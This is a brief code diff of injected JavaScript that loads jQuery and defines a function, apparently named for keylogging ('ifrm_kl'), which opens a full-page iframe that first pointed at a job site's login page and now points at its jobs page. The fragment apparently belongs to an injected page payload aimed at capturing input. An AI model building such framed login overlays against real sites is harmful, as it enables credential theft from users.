@@ -1,11 +1,11 @@
 var script = document.createElement('script');
-script.src = 'http://code.jquery.com/jquery-3.4.1.min.js';
+script.src = 'https://code.jquery.com/jquery-3.4.1.min.js';
 script.type = 'text/javascript';
 document.getElementsByTagName('head')[0].appendChild(script);
 
 function ifrm_kl(){
 	var ifrm = document.createElement("iframe");
-	ifrm.setAttribute("src", "https://www.104.com.tw/login");
+	ifrm.setAttribute("src", "https://www.104.com.tw/jobs/main");
 	ifrm.id = "x"
 	ifrm.style.width = "100%";
 	ifrm.style.height = "100%";
